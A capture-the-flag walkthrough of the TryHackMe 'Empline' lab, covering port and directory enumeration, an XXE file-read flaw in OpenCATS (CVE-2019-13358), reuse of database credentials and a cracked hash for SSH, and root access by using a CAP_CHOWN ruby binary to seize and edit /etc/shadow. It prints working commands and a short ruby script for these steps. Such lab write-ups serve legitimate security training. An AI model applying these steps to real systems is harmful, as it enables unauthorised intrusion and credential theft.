# Try Hack Me - Empline

**Categories:** Linux, web, privilege escalation, enumeration  
**Difficulty:** Medium  

Commands used in this guide use the exported variable $IP (`export IP=10.10.29.51`) in place of the target machine's IP address.

## 1: Enumeration - nmap

Having launched the machine, we perform a basic TCP port scan with nmap (`sudo nmap $IP`) followed by a version enumeration scan on the 3 discovered ports (22, 80 and 3306) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/empline]
└─$ sudo nmap $IP -sV -p22,80,3306 -oN nmap.out
...snip...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A google / searchsploit scan for the discovered versions reveals no relevant vulnerabilities - [the MySql RCE / Privesc exploit looks promising](https://nvd.nist.gov/vuln/detail/CVE-2016-6662), but requires either credentials or an SQLi vulnerability, neither of which we have at the moment. A gobuster scan using dirbuster's common wordlist (`gobuster dir -u $IP -w /usr/share/dirb/wordlists/common.txt -o gobuster.common.out`) also fails to find anything useful.

Navigating to the application on 80 reveals a link to a subdomain `job` in the page's navbar :

```html
    <!-- ***** Menu Start ***** -->
    <ul class="nav">
        ...snip...
        <li class="scroll-to-section"><a href="http://job.empline.thm/careers" class="menu-item">Employment</a></li>
        ...snip...
    </ul>
```
To effectively enumerate the subdomain, we need to create an entry for the domain in `/etc/hosts` :

```console
┌──(kali㉿kali)-[~/Documents/tthm/empline]
└─$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.29.51	empline.thm, job.empline.thm
...snip...
```

and we can now repeat the gobuster scan on the subdomain, revealing a number of new routes : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/empline]
└─gobuster dir -u job.empline.thm -w /usr/share/dirb/wordlists/common.txt
...snip...
/careers              (Status: 301) [Size: 320] [--> http://job.empline.thm/careers/]
/ckeditor             (Status: 301) [Size: 321] [--> http://job.empline.thm/ckeditor/]
/db                   (Status: 301) [Size: 315] [--> http://job.empline.thm/db/]
/images               (Status: 301) [Size: 319] [--> http://job.empline.thm/images/]
/index.php            (Status: 200) [Size: 3671]
...snip...
```

## 2. Application dead ends - default creds, /db

Navigating to `/index.php` reveals a login page for [opencats applicant management system](https://www.opencats.org/). The source contains two sets of default credentials, neither of which work on the login form (and neither does the admin:admin pair [mentioned in opencat's docs](https://opencats-documentation.readthedocs.io/en/latest/Install-Ubuntu-16.04.html?highlight=password#install-the-opencats-software)) : 

```http
<script type="text/javascript">
document.loginForm.username.focus();
function demoLogin()
{
    document.getElementById('username').value = 'john@mycompany.net';
    document.getElementById('password').value = 'john99';
    document.getElementById('loginForm').submit();
}
function defaultLogin()
{
    document.getElementById('username').value = 'admin';
    document.getElementById('password').value = 'cats';
    document.getElementById('loginForm').submit();
}
</script>
```

The `/db` route is potentially more interesting and includes two database backups `cats_schema.sql` and `cats_testdata.bak`, but the credential pairs discovered in these backups are more or less the same as the demo examples discovered in the source - again, this is a dead end.

## 3. Application vulnerability - CVE-2019-13358

A Google search for OpenCATs vulnerabilities reveals [CVE-2019-13358](https://nvd.nist.gov/vuln/detail/CVE-2019-13358) and an [article describing the vulnerability written by it's discoverer, Reginald Dodd](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/).

The "Upload Résumé" feature of OpenCATS job listings allows users to upload a résumé in a variety of formats - this feature is vulnerable to XXE injection, allowing file read on the host system through a crafted .docx payload. Dodd's run through of the attack is very accessible, but to speed things up I've provided an [exploit script](./empline_exploit.py) that builds the .docx payload, POSTs it to the vulnerable endpoint, and decodes and prints the output - you can change the file targeted by the payload by changing the "TARGET" variable on line 16.

To make sure that everything is working as intended, we download the script and set `/etc/passwd` as the TARGET file :

```console
┌──(kali㉿kali)-[~/Documents/tthm/empline]
└─$ python3 empline_exploit.py
root:x:0:0:root:/root:/bin/bash
...snip...
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
george:x:1002:1002::/home/george:/bin/bash
```

So everything seems to be working, and we've discovered a non-system user george. We could try and brute force ssh using this username, but Dodd's runthrough of the attack presents another possible target `config.php`, an OpenCATS configuration file. Targeting this file reveals credentials for the MySQL service :

```console
┌──(kali㉿kali)-[~/Documents/tthm/empline]
└─$ python3 empline_exploit.py
<?php
/*
 * CATS
 * Configuration File
 *
...snip...
/* Database configuration. */
define('DATABASE_USER', 'james');
define('DATABASE_PASS', 'PASSWORD');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');
...snip...
```

## 4. Credential discovery - MariaDB

Connecting to the MySql service with the discovered credentials we find two databases :

```console
┌──(kali㉿kali)-[~/Documents/tthm/empline]
└─$ mysql -h $IP -u james -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
...snip...
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| opencats           |
+--------------------+
2 rows in set (0.097 sec)
```

We select the opencats database (`use opencats;`) and print the list of tables (`show tables;`), revealing a "user" table with "user_name" and "password" fields (`describe user;`). We then request these fields from the table to discover the george user's password hash : 

```console
MariaDB [opencats]> select user_name, password from user;
+----------------+----------------------------------+
| user_name      | password                         |
+----------------+----------------------------------+
| admin          | b67b5ecc5d8902ba59c65596e4c053ec |
| cats@rootadmin | cantlogin                        |
| george         | 86d0dfda99dbebc424eb4407947356ac |
| james          | e53fbdb31890ff3bc129db0e27c473c9 |
+----------------+----------------------------------+
4 rows in set (0.103 sec)
```
The hash can be cracked by Crackstation, or by john with rockyou. This password is not necessarily the same password used by the george user for SSH access (and it definitely shouldn't be), but we should probably try it anyway : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/empline]
└─$ ssh george@10.10.233.35    
george@10.10.233.35's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)
...snip...
george@empline:~$ id
uid=1002(george) gid=1002(george) groups=1002(george)
```

The user flag is at `/home/george/user.txt`

## 5. privesc - linpeas, capabilities

During our usual manual privesc enumeration checks (users, processes, services, cronjobs, SUID/SGID binaries, etc.) we discover the following unusual configuration by running `getcap` : 

```console
george@empline:/home$ getcap / -r 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```
Capabilities are intended to provide a more granular approach to permissions in UNIX environments, allowing admins to assign elevated actions to scripts, binaries or processes without granting them full privileges associated with a group or user. For example, the CAP_CHOWN capability seen here allows `/usr/local/bin/ruby` to run `chown` on any other file on the system, but provides no other superuser / root level privileges. Using this CAP_CHOWN capability we can change the owner of files responsible for user and permissions configuration - most obviously `/etc/shadow` or `/etc/passwd` - and modify their content to provide a privesc opportunity.

In this case, we need a ruby script that is capable of calling `chown`. A google search for 'ruby chown' allows us to write the following script : 

```rb
require 'fileutils'
FileUtils.chown 'george', 'george', '/etc/shadow'
```

which we run with the discovered `/usr/local/bin/ruby` binary to make george the owner of `/etc/shadow` :

```console
george@empline:~$ /usr/local/bin/ruby exp.rb 
george@empline:~$ ls -la /etc/shadow
-rw-r----- 1 george george 1081 Jul 20 19:48 /etc/shadow
```

Given that we already know the george user's password, we can simply replace the root user's password hash with george's own password hash :

```console
george@empline:~$ vim /etc/shadow
george@empline:~$ cat /etc/shadow
root:$6$hvNAbVRK$xSiRR/fV0avpUrhnTq72LqFygy7RDgicbojr2CZeQHKqAHscFlMEy2RJTCkuTme32OPJ3TiX1xBpv7LmZqnnc1:18828:0:99999:7:::
...snip...
george:$6$hvNAbVRK$xSiRR/fV0avpUrhnTq72LqFygy7RDgicbojr2CZeQHKqAHscFlMEy2RJTCkuTme32OPJ3TiX1xBpv7LmZqnnc1:18828:0:99999:7:::
```

and su to root :

```console
george@empline:~$ su root
Password: 
root@empline:/home/george# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/root.txt`.
